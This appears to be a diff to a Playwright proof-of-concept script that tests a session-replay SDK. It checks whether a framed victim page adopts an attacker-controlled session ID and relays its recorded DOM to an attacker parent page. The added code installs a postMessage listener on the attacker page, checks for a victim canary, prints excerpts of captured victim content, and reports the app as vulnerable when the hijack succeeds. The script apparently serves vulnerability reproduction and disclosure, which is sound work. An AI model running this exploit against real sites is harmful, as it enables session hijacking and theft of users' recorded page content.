@@ -243,6 +243,7 @@ async function run() {
 
 	let scenario0
 	let scenario1
+	let attackerReceived = []
 
 	try {
 		// ---------- Scenario 0: control (framed victim, no handshake) ----------
@@ -265,18 +266,36 @@ async function run() {
 		{
 			capturedRequests.length = 0
 			const context = await browser.newContext()
+			// The attacker page is the PARENT window. In cross-origin-iframe mode
+			// the SDK does not push DOM to the backend (that timer is gated to
+			// non-iframe); instead the framed victim relays its rrweb recording
+			// up to its parent via postMessage. So the attacker simply listens.
+			await context.addInitScript(() => {
+				window.__ylgenRx = []
+				window.addEventListener('message', (e) => {
+					try {
+						window.__ylgenRx.push(
+							typeof e.data === 'string'
+								? e.data
+								: JSON.stringify(e.data),
+						)
+					} catch (_) {}
+				})
+			})
 			const page = await context.newPage()
 			await page.goto(`${ATTACKER_ORIGIN}/`, { waitUntil: 'load' })
 			const deadline = Date.now() + CAPTURE_TIMEOUT_MS
 			while (Date.now() < deadline) {
-				// keep going until a content payload (pushPayload/rrweb batch)
-				// carrying the victim canary is exported, not just the first
-				// metadata request under the attacker session
+				const rx = await page.evaluate(() => window.__ylgenRx || [])
+				// stop as soon as the victim's recorded content (canary) reaches
+				// the attacker parent, or a backend payload carries it
+				if (rx.join('\n').includes(CANARY)) break
 				if (inspect([...capturedRequests]).canarySeen) break
 				await page.waitForTimeout(1000)
 			}
-			// settle for any final in-flight flush
-			await page.waitForTimeout(6000)
+			// settle for any final in-flight relay/flush
+			await page.waitForTimeout(4000)
+			attackerReceived = await page.evaluate(() => window.__ylgenRx || [])
 			scenario1 = inspect([...capturedRequests])
 			await context.close()
 		}
@@ -299,29 +318,49 @@ async function run() {
 	)
 	console.log(`Scenario 1 operations seen: ${scenario1.operations.join(', ') || '(none)'}`)
 
+	const attackerMsgs = attackerReceived || []
+	const attackerJoined = attackerMsgs.join('\n')
+	const attackerGotCanary = attackerJoined.includes(CANARY)
+	const attackerGotRrweb =
+		/"type"\s*:\s*\d/.test(attackerJoined) ||
+		attackerJoined.toLowerCase().includes('rrweb') ||
+		/"tag"\s*:/.test(attackerJoined)
+	console.log(
+		`Parent channel: attacker page received ${attackerMsgs.length} postMessage(s) from the framed victim; ` +
+			`victim canary present: ${attackerGotCanary}; rrweb-shaped data present: ${attackerGotRrweb}`,
+	)
+
 	const controlClean = scenario0.attackerSessionSeen === false
 	const hijackProven =
 		scenario1.attackerSessionSeen === true && scenario1.count > 0
-	const contentProven = scenario1.canarySeen === true
+	const contentProven = scenario1.canarySeen === true || attackerGotCanary
 
 	console.log('')
 	console.log(`RESULT control (no handshake -> no export to attacker): ${controlClean}`)
 	console.log(`RESULT hijack (victim export carries attacker session): ${hijackProven}`)
-	console.log(`RESULT victim content present in hijacked export:       ${contentProven}`)
+	console.log(`RESULT victim content reached attacker (canary):        ${contentProven}`)
 
 	if (scenario1.count > 0) {
 		console.log('')
-		console.log('=== First hijacked export request (truncated) ===')
+		console.log('=== First backend request under the hijacked session (truncated) ===')
 		const first = capturedRequests[0]
 		console.log(`URL: ${first.url}`)
-		console.log(first.body.slice(0, 600))
+		console.log(first.body.slice(0, 400))
+	}
+
+	if (attackerGotCanary) {
+		const sample = attackerMsgs.find((m) => m.includes(CANARY)) || ''
+		const idx = Math.max(0, sample.indexOf(CANARY) - 120)
+		console.log('')
+		console.log('=== Victim content received by the attacker parent (excerpt around canary) ===')
+		console.log(sample.slice(idx, idx + 320))
 	}
 
 	console.log('')
 	console.log(
 		hijackProven
-			? 'VERDICT: VULNERABLE — the victim session replay was exported under the attacker-controlled session ID.'
-			: 'VERDICT: NOT REPRODUCED — no export under the attacker session ID was observed.',
+			? 'VERDICT: VULNERABLE — the framed victim adopts the attacker session, and its recording is exfiltrated to the attacker (session identity to the backend; recorded DOM to the attacker parent).'
+			: 'VERDICT: NOT REPRODUCED — no hijack observed.',
 	)
 	process.exitCode = hijackProven ? 0 : 1
 }
